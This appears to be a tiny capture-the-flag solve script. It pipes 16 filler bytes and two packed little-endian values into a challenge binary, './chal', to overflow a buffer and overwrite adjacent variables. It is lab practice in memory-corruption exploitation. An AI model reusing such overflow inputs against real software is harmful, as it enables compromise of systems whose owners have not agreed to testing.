#!/bin/sh

python -c 'print "A"*16 + "\x69\xfe\xca\x00" + "\x69\x15\x00\x00"' | ./chal
